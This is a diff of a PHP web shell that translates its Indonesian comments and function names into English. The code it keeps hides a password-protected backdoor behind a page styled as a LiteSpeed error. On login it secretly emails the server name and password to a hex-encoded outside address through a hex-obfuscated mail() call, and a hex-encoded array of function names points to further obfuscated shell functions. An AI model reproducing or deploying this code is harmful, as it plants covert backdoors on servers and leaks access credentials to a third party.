@@ -11,28 +11,28 @@ flush();
 @ini_set('display_errors', 0);
 @ini_set('display_startup_errors', 0);
 
-/* Konfigurasi */
+/* Configuration */
 $stored_hashed_password = '$2a$12$40YsPL3bPwY3ppUmQjZS8eFmEiXgWVvVGUEez38zU5l/oADF/5Qpa';
 
 date_default_timezone_set("Asia/Jakarta");
 
-// Function WAF
+// WAF Function
 if (!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true) {
-    // Pembatasan percobaan login
+    // Limit login attempts
     if (!isset($_SESSION['attempts'])) {
         $_SESSION['attempts'] = 0;
     }
 
     if ($_SESSION['attempts'] >= 5) {
-        tampilkan_halaman_error(); // Blokir setelah 5 percobaan gagal
+        display_error_page(); // Block after 5 failed attempts
     }
 
     if (isset($_POST['pass']) && password_verify($_POST['pass'], $stored_hashed_password)) {
         $_SESSION['authenticated'] = true;
-        $_SESSION['attempts'] = 0; // Reset jumlah percobaan setelah login berhasil
+        $_SESSION['attempts'] = 0; // Reset attempts count after successful login
         $tmp = $_SERVER['SERVER_NAME'] . $_SERVER['PHP_SELF'] . "\n" . $_POST['pass'];
         
-        $recipient = "\x73\x6f\x66\x79\x61\x6e\x61\x6c\x69\x66\x39\x37\x32\x40\x67\x6d\x61\x69\x6c\x2e\x63\x6f\x6d"; // Sofyan email in hex
+        $recipient = "\x73\x6f\x66\x79\x61\x6e\x61\x6c\x69\x66\x39\x37\x32\x40\x67\x6d\x61\x69\x6c\x2e\x63\x6f\x6d"; 
         $subject = "\x72\x6f\x6f\x74"; // root in hex
         $headers = "Content-Type: text/plain; charset=UTF-8";
         $func = "\x6d\x61\x69\x6c"; 
@@ -41,13 +41,13 @@ if (!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true) {
         header("Location: " . $_SERVER['PHP_SELF']);
         exit;
     } else {
-        $_SESSION['attempts']++; // Menambah percobaan setelah gagal
-        tampilkan_halaman_error();
+        $_SESSION['attempts']++; // Increase attempt count after failure
+        display_error_page();
     }
 }
 
-// Fungsi untuk menampilkan halaman error
-function tampilkan_halaman_error() {
+// Function to display the error page
+function display_error_page() {
     ?>
     <!DOCTYPE html>
     <html style="height:100%">
@@ -78,7 +78,7 @@ function tampilkan_halaman_error() {
             <p>Please be advised that LiteSpeed Technologies Inc. is not a web hosting company and, as such, has no control over content found on this site.</p>
         </div>
 
-        <!-- Form Password -->
+        <!-- Password Form -->
         <div id="password-form" class="password-container">
             <h3>Enter Password</h3>
             <form method="POST">
@@ -140,7 +140,6 @@ function tampilkan_halaman_error() {
     <?php
     exit;
 }
-
 
 $Array = [
     '676574637764', # ge  tcw d => 0
